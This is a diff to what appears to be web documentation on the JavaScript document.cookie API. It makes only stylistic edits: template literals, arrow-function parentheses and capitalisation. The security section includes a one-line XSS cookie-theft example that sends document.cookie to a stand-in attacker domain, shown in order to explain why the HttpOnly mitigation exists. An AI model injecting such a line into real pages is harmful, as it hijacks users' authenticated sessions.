@@ -138,7 +138,7 @@ document.cookie = "favorite_food=tripe; SameSite=None; Secure";
 
 function showCookies() {
   const output = document.getElementById('cookies')
-  output.textContent = '> ' + document.cookie
+  output.textContent = `> ${document.cookie}`
 }
 
 function clearOutputCookies() {
@@ -173,12 +173,12 @@ document.cookie = "test2=World; SameSite=None; Secure";
 
 const cookieValue = document.cookie
   .split('; ')
-  .find(row => row.startsWith('test2='))
+  .find((row) => row.startsWith('test2='))
   ?.split('=')[1];
 
 function showCookieValue() {
   const output = document.getElementById('cookie-value')
-  output.textContent = '> ' + cookieValue
+  output.textContent = `> ${cookieValue}`
 }
 
 function clearOutputCookieValue() {
@@ -208,7 +208,7 @@ In order to use the following code, please replace all occurrences of the word
 
 ```js
 function doOnce() {
-  if (!document.cookie.split('; ').find(row => row.startsWith('doSomethingOnlyOnce'))) {
+  if (!document.cookie.split('; ').find((row) => row.startsWith('doSomethingOnlyOnce'))) {
     // Note that we are setting `SameSite=None;` in this example because the example
     // needs to work cross-origin.
     // It is more common not to set the `SameSite` attribute, which results in the default,
@@ -358,11 +358,11 @@ session. Stealing a cookie from a web application leads to hijacking the
 authenticated user's session. Common ways to steal cookies include using [social engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) or by exploiting a [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) vulnerability in the application -
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+(new Image()).src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
 ```
 
 The `HTTPOnly` cookie attribute can help to mitigate this attack by
-preventing access to cookie value through Javascript. Read more about [Cookies and Security](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).
+preventing access to cookie value through JavaScript. Read more about [Cookies and Security](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).
 
 ## Notes
 
